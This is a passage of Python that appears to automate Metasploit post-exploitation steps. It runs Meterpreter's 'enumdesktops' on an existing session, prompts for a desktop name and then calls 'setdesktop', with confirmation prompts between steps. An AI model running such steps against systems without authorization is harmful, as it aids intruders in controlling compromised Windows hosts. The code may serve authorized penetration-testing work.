...
async def main():
    ...
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: enumdesktops[/]")
    confirm_action()
    try:
        metasploit_executor.enumdesktops(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 8 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: desktop_name[/]")
    console.print(f"  Description: Target desktop identifier (e.g. winsta0\default)")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for desktop_name [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: desktop_name")
    user_params["desktop_name"] = user_input

    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: setdesktop[/]")
    confirm_action()
    try:
        metasploit_executor.setdesktop(user_params["desktop_name"], user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
